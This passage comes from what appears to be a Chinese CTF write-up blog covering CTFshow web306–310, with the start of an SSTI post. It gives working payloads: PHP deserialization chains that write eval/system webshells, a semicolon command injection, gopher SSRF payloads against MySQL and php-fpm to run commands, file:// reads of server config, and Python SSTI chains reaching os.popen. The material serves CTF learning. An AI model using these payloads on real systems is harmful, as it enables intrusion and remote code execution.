class="variable">$a</span>));</span><br></pre></td></tr></table></figure><p>得到：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">O%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">22</span>dao%<span class="number">22</span>%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A11%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>dao%<span class="number">00</span>config%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>Bs%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>conn%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">22</span>log%<span class="number">22</span>%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A5%<span class="number">3</span>A%<span class="number">22</span>title%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A5%<span class="number">3</span>A%<span class="number">221</span>.php%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>info%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A24%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">3</span>C%<span class="number">3</span>Fphp+<span class="keyword">eval</span>%<span class="number">28</span>%<span class="number">24</span>_POST%<span class="number">5</span>B1%<span class="number">5</span>D%<span class="number">29</span>%<span class="number">3</span>B%<span class="number">3</span>F%<span class="number">3</span>E%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">7</span>D%<span class="number">7</span>D</span><br><span class="line">修改<span class="keyword">public</span>为<span class="keyword">private</span>，并且修改字符个数</span><br><span class="line">O%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">22</span>dao%<span class="number">22</span>%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A11%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>dao%<span class="number">00</span>config%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>Bs%<span class="number">3</span>A9%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>dao%<span class="number">00</span>conn%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">22</span>log%<span class="number">22</span>%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A5%<span class="number">3</span>A%<span class="number">22</span>title%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A5%<span class="number">3</span>A%<span class="number">221</span>.php%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>info%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A24%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">3</span>C%<span class="number">3</span>Fphp+<span class="keyword">eval</span>%<span class="number">28</span>%<span class="number">24</span>_POST%<span class="number">5</span>B1%<span class="number">5</span>D%<span class="number">29</span>%<span class="number">3</span>B%<span class="number">3</span>F%<span class="number">3</span>E%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">7</span>D%<span class="number">7</span>D</span><br><span class="line">再套一层base64</span><br></pre></td></tr></table></figure><p>这以上都是错的<br>妈的 那个base64之前不需要url转义，而且有更好的写法，利用construct构造方法解决：<br>新的exp：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dao</span></span>&#123;</span><br><span class="line"><span class="keyword">private</span> <span class="variable">$conn</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;conn=<span class="keyword">new</span> <span class="title function_ invoke__">log</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">log</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$title</span>=<span class="string">&#x27;a.php&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$info</span>=<span class="string">&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">dao</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>擦，卡在了密码这半小时，密码是<code>admin1</code>，仔细读了一下代码，发现多层md5加密，而且有salt，因此应该是弱口令爆破出来。研究了半天hashcat。</p><h1 id="web307"><a href="#web307" class="headerlink" title="web307"></a>web307</h1><p>直接上cnseay，一键审计。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1694926443971-a06d0593-19be-4cb4-bf93-27dc36a331f5.png" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1694926518010-4273905e-a413-4f6e-9968-494658b6560c.png" alt="image.png"><br>第二个直接用分号隔断进行命令执行即可。<br>构造一下内容，写个马。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">config</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cache_dir</span> = <span class="string">&#x27;;echo &quot;&lt;?php system($_POST[1]); ?&gt;&quot; &gt; 1.php;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dao</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$config</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;config = <span class="keyword">new</span> <span class="title function_ invoke__">config</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">dao</span>()));</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TzozOiJkYW8iOjE6e3M6MTE6IgBkYW8AY29uZmlnIjtPOjY6ImNvbmZpZyI6MTp7czo5OiJjYWNoZV9kaXIiO3M6NDQ6IjtlY2hvICI8P3BocCBzeXN0ZW0oJF9QT1NUWzFdKTsgPz4iID4gMS5waHA7Ijt9fQ</span><br></pre></td></tr></table></figure><p>我们这里激活点用的是：logout下的，因此注意生成马的相对路径前也有个controller<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1694927480974-575e9f4d-bcdc-4475-9bcb-da89a43c285a.png" alt="image.png"><br>测了，校园网传不上去payload。直接写入读一下吧。</p><h1 id="web308"><a href="#web308" class="headerlink" title="web308"></a>web308</h1><h3 id="SSRF打mysql"><a href="#SSRF打mysql" class="headerlink" title="SSRF打mysql"></a>SSRF打mysql</h3><blockquote><p><a href="https://blog.csdn.net/qq_42880719/article/details/122510390">https://blog.csdn.net/qq_42880719/article/details/122510390</a></p></blockquote><p>我合计还用原来的写法，前后拼接一下，应该还能用，但是wp用了ssrf。正好没接触过，学一下。</p><blockquote><p>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）</p></blockquote><p>通过gopherus生成payload来打mysql<br>利用点在：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkUpdate</span>(<span class="params"><span class="variable">$url</span></span>)</span>&#123;</span><br><span class="line"><span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>();</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="literal">false</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="literal">true</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_FOLLOWLOCATION, <span class="literal">true</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_SSL_VERIFYPEER, <span class="literal">false</span>); </span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_SSL_VERIFYHOST, <span class="literal">false</span>);</span><br><span class="line"><span class="variable">$res</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Give MySQL username: root</span><br><span class="line">Give query to execute: select <span class="string">&quot;&lt;?php eval(<span class="subst">$_POST</span>[1]);?&gt;&quot;</span> into outfile <span class="string">&quot;/var/www/html/1.php&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1694929570468-2704a7e4-7a92-4c63-bbb9-e5f479587b22.png" alt="image.png"><br>poc：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">config</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$update_url</span> = <span class="string">&#x27;gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%45%00%00%00%03%73%65%6c%65%63%74%20%22%3c%3f%70%68%70%20%65%76%61%6c%28%24%5f%50%4f%53%54%5b%31%5d%29%3b%3f%3e%22%20%69%6e%74%6f%20%6f%75%74%66%69%6c%65%20%22%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%31%2e%70%68%70%22%01%00%00%00%01&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dao</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$config</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;config = <span class="keyword">new</span> <span class="title function_ invoke__">config</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">dao</span>()));</span><br><span class="line"><span class="comment">//TzozOiJkYW8iOjE6e3M6MTE6IgBkYW8AY29uZmlnIjtPOjY6ImNvbmZpZyI6MTp7czoxMDoidXBkYXRlX3VybCI7czo3NjA6ImdvcGhlcjovLzEyNy4wLjAuMTozMzA2L18lYTMlMDAlMDAlMDElODUlYTYlZmYlMDElMDAlMDAlMDAlMDElMjElMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlNzIlNmYlNmYlNzQlMDAlMDAlNmQlNzklNzMlNzElNmMlNWYlNmUlNjElNzQlNjklNzYlNjUlNWYlNzAlNjElNzMlNzMlNzclNmYlNzIlNjQlMDAlNjYlMDMlNWYlNmYlNzMlMDUlNGMlNjklNmUlNzUlNzglMGMlNWYlNjMlNmMlNjklNjUlNmUlNzQlNWYlNmUlNjElNmQlNjUlMDglNmMlNjklNjIlNmQlNzklNzMlNzElNmMlMDQlNWYlNzAlNjklNjQlMDUlMzIlMzclMzIlMzUlMzUlMGYlNWYlNjMlNmMlNjklNjUlNmUlNzQlNWYlNzYlNjUlNzIlNzMlNjklNmYlNmUlMDYlMzUlMmUlMzclMmUlMzIlMzIlMDklNWYlNzAlNmMlNjElNzQlNjYlNmYlNzIlNmQlMDYlNzglMzglMzYlNWYlMzYlMzQlMGMlNzAlNzIlNmYlNjclNzIlNjElNmQlNWYlNmUlNjElNmQlNjUlMDUlNmQlNzklNzMlNzElNmMlNDUlMDAlMDAlMDAlMDMlNzMlNjUlNmMlNjUlNjMlNzQlMjAlMjIlM2MlM2YlNzAlNjglNzAlMjAlNjUlNzYlNjElNmMlMjglMjQlNWYlNTAlNGYlNTMlNTQlNWIlMzElNWQlMjklM2IlM2YlM2UlMjIlMjAlNjklNmUlNzQlNmYlMjAlNmYlNzUlNzQlNjYlNjklNmMlNjUlMjAlMjIlMmYlNzYlNjElNzIlMmYlNzclNzclNzclMmYlNjglNzQlNmQlNmMlMmYlMzElMmUlNzAlNjglNzAlMjIlMDElMDAlMDAlMDAlMDEiO319</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1694930006097-a4bea450-bf23-4cf0-9c25-36c2a0e97031.png" alt="image.png"><br>爆破进去。<br>然后再index.php页面cookie中传入service中传入需要的payload即可。<br>然后访问1.php传参获取flag即可。</p><h1 id="web309"><a href="#web309" class="headerlink" title="web309"></a>web309</h1><h3 id="SSRF打fastcgi"><a href="#SSRF打fastcgi" class="headerlink" title="SSRF打fastcgi"></a>SSRF打fastcgi</h3><p>这根本不会，直接超wp</p><blockquote><p>在静态网站中，WEB 容器如 Apache、Nginx 相当于内容分发员的角色， 根据用户请求的页面从网站根目录中返回给用户；而在动态网站中，WEB 容器例如 Apache 会根据用户的请求进行简单处理后交给 php 解释器；当 Apache 收到用户对 index.php 的请求后，如果使用的是 CGI，会启动对应的 CGI 程序，对应在这里就是 PHP 的解析器。接下来 PHP 解析器会解析 php.ini 文件，初始化执行环境，然后处理请求，再以规定 CGI 规定的格式返回处理后的结果，退出进程，Web server 再把结果返回给浏览器。这就是一个完整的动态 PHP Web 访问流程<br>这里说的是使用 CGI，而 FastCGI 就相当于高性能的 CGI，与 CGI 不同的是它像一个常驻的 CGI，在启动后会一直运行着，不需要每次处理数据时都启动一次， 所以这里引出下面这句概念，FastCGI 是语言无关的、可伸缩架构的 CGI 开放扩展，其主要行为是将 CGI 解释器进程保持在内存中，并因此获得较高的性能</p></blockquote><blockquote><p>探测是通过gopher协议的延迟判断的<br>gopher://127.0.0.1:9000<br>通过http或其他协议去探测内网，如果ip存活则短延迟(不管端口开没开)，如果ip不存在则长延迟</p></blockquote><p>php-fpm</p><blockquote><p>在静态网站中，WEB 容器如 Apache、Nginx 相当于内容分发员的角色， 根据用户请求的页面从网站根目录中返回给用户；而在动态网站中，WEB 容器例如 Apache 会根据用户的请求进行简单处理后交给 php 解释器；当 Apache 收到用户对 index.php 的请求后，如果使用的是 CGI，会启动对应的 CGI 程序，对应在这里就是 PHP 的解析器。接下来 PHP 解析器会解析 php.ini 文件，初始化执行环境，然后处理请求，再以规定 CGI 规定的格式返回处理后的结果，退出进程，Web server 再把结果返回给浏览器。这就是一个完整的动态 PHP Web 访问流程</p><p>这里说的是使用 CGI，而 FastCGI 就相当于高性能的 CGI，与 CGI 不同的是它像一个常驻的 CGI，在启动后会一直运行着，不需要每次处理数据时都启动一次， 所以这里引出下面这句概念，FastCGI 是语言无关的、可伸缩架构的 CGI 开放扩展，其主要行为是将 CGI 解释器进程保持在内存中，并因此获得较高的性能</p></blockquote><p>假设在配置fpm时，将监听的地址设为了0.0.0.0:9000，那么就会产生php-fpm未授权访问漏洞，此时攻击者可以无需利用SSRF从服务器本地访问的特性，直接与服务器9000端口上的php-fpm进行通信，进而可以用fcgi_exp等工具去攻击服务器上的php-fpm实现任意代码执行<br>还是gopherus这个工具</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Give one file name which should be surely present in the <span class="title function_ invoke__">server</span> (prefer .php file)</span><br><span class="line"><span class="keyword">if</span> you don<span class="string">&#x27;t know press ENTER we have default one:  index.php</span></span><br><span class="line"><span class="string">Terminal command to run:  cat /var/www/html/f* &gt; flag.txt</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1694931120245-d9009d25-d5ae-46ed-8b4d-88f63969465b.png" alt="image.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher:<span class="comment">//127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%00%F6%06%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH83%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%09SCRIPT_FILENAMEindex.php%0D%01DOCUMENT_ROOT/%00%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00S%04%00%3C%3Fphp%20system%28%27cat%20/var/www/html/f%2A%20%3E%20flag.txt%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1694932814438-81db3baf-612d-4ee1-a108-834406771f26.png" alt="image.png"></p><h1 id="web310"><a href="#web310" class="headerlink" title="web310"></a>web310</h1><h3 id="SSRF读文件"><a href="#SSRF读文件" class="headerlink" title="SSRF读文件"></a>SSRF读文件</h3><p>admin-admin1<br>伪协议读nginx.conf:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">config</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$update_url</span> = <span class="string">&#x27;file:///etc/nginx/nginx.conf&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dao</span></span>&#123;</span><br><span class="line"><span class="keyword">private</span> <span class="variable">$config</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;config=<span class="keyword">new</span> <span class="title function_ invoke__">config</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">dao</span>()));</span><br><span class="line"></span><br><span class="line"><span class="comment"># TzozOiJkYW8iOjE6e3M6MTE6IgBkYW8AY29uZmlnIjtPOjY6ImNvbmZpZyI6MTp7czoxMDoidXBkYXRlX3VybCI7czoyODoiZmlsZTovLy9ldGMvbmdpbngvbmdpbnguY29uZiI7fX0=</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1694932331570-e41b1877-b7a5-4e2f-8362-9700d2a562af.png" alt="image.png">每一个http块都可以包含多个server块，而每个server块就相当于一台虚拟主机，它内部可有多台主机联合提供服务，一起对外提供在逻辑上关系密切的一组服务</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">        listen       <span class="number">4476</span>;</span><br><span class="line">        server_name  localhost;</span><br><span class="line">        root         /<span class="keyword">var</span>/flag;</span><br><span class="line">        index index.html;</span><br><span class="line"></span><br><span class="line">        proxy_set_header Host <span class="variable">$host</span>;</span><br><span class="line">        proxy_set_header X-Real-IP <span class="variable">$remote_addr</span>;</span><br><span class="line">        proxy_set_header X-Forwarded-For <span class="variable">$proxy_add_x_forwarded_for</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">config</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$update_url</span> = <span class="string">&#x27;http://127.0.0.1:4476&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dao</span></span>&#123;</span><br><span class="line"><span class="keyword">private</span> <span class="variable">$config</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;config=<span class="keyword">new</span> <span class="title function_ invoke__">config</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">dao</span>()));</span><br><span class="line"></span><br><span class="line"><span class="comment"># TzozOiJkYW8iOjE6e3M6MTE6IgBkYW8AY29uZmlnIjtPOjY6ImNvbmZpZyI6MTp7czoxMDoidXBkYXRlX3VybCI7czoyMToiaHR0cDovLzEyNy4wLjAuMTo0NDc2Ijt9fQ==</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1694932555604-4cbee450-6891-43ef-8b0b-141cacb63afb.png" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
            <tag> CTFshow0-1 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web361-web372SSTI篇</title>
      <link href="/2023/09/17/web361-web372SSTI%E7%AF%87/"/>
      <url>/2023/09/17/web361-web372SSTI%E7%AF%87/</url>
      
        <content type="html"><![CDATA[<p>本文中所有{ {、{ %，其余同理中本来应该没有空格，但是由于与Nunjunks语法碰撞，因此修改。</p><blockquote><p><a href="https://blog.csdn.net/q20010619/article/details/120493997">https://blog.csdn.net/q20010619/article/details/120493997</a></p></blockquote><h1 id=""><a href="#" class="headerlink" title=""></a><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1690099738699-84cc7144-2cf6-458f-9d0b-4c39ad5e29f5.png" alt="image.png"></h1><p>代码块：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">变量块 &#123; &#123;&#125; &#125;用于将表达式打印到模板输出</span><br><span class="line">注释块 &#123;<span class="comment">##&#125;注释</span></span><br><span class="line">控制块&#123; %% &#125;可以声明变量，也可以执行语句</span><br><span class="line">行声明<span class="comment">##可以有和&#123; %% &#125;相同的效果</span></span><br></pre></td></tr></table></figure><p>常用方法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">__class__           查看对象所在的类</span><br><span class="line">__mro__             查看继承关系和调用顺序，返回元组</span><br><span class="line">__base__            返回基类</span><br><span class="line">__bases__           返回基类元组</span><br><span class="line">__subclasses__()    返回子类列表</span><br><span class="line">__init__            调用初始化函数，可以用来跳到__globals__</span><br><span class="line">__globals__         返回函数所在的全局命名空间所定义的全局变量，返回字典</span><br><span class="line">__builtins__        返回内建内建名称空间字典</span><br><span class="line">__dic__              类的静态函数、类函数、普通函数、全局变量以及一些内置的属性都是放在类的__dict__里</span><br><span class="line">__getattribute__()   实例、类、函数都具有的__getattribute__魔术方法。事实上，在实例化的对象进行.操作的时候（形如:a.xxx/a.xxx()）都会自动去调用__getattribute__方法。因此我们同样可以直接通过这个方法来获取到实例、类、函数的属性。</span><br><span class="line">__getitem__()        调用字典中的键值，其实就是调用这个魔术方法，比如a[<span class="string">&#x27;b&#x27;</span>]，就是a.__getitem__(<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">__builtins__         内建名称空间，内建名称空间有许多名字到对象之间映射，而这些名字其实就是内建函数的名称，对象就是这些内建函数本身。即里面有很多常用的函数。__builtins__与__builtin__的区别就不放了，百度都有。</span><br><span class="line"><span class="built_in">__import__</span>           动态加载类和函数，也就是导入模块，经常用于导入os模块，<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;ls&#x27;</span>).read()]</span><br><span class="line">__str__()            返回描写这个对象的字符串，可以理解成就是打印出来。</span><br><span class="line">url_for              flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>]含有current_app</span><br><span class="line">get_flashed_messages flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>]含有current_app</span><br><span class="line">lipsum               flask的一个方法，可以用于得到__builtins__，而且lipsum.__globals__含有os模块：&#123; &#123;lipsum.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span 